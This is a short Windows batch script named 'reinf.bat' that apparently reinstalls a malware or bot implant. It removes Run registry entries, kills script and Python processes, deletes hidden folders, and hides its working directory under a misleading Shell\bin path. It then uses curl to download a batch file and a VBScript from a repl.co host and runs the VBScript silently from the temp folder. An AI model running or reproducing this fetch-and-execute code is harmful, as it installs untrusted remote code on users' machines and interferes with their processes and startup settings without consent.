@echo off
title reinf.bat
color 2
cls

powershell Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "*0"
taskkill /f /t /im wscript.exe
taskkill /f /t /im python.exe
taskkill /f /t /im python3.10.exe
taskkill /t /im cmd.exe


attrib -H "C:\Users\All Users\vienum"
rd /s /q "C:\Users\All Users\vienum\NUL\"
rd /s /q "C:\Users\All Users\vienum"
rd /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\
rd /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\
curl https://megabotbot.ungaung.repl.co/install.bat -o "%tmp%\install.bat"
curl https://megabotbot.ungaung.repl.co/install.txt -o "%tmp%\install.vbs"
start /b %tmp%\install.vbs
exit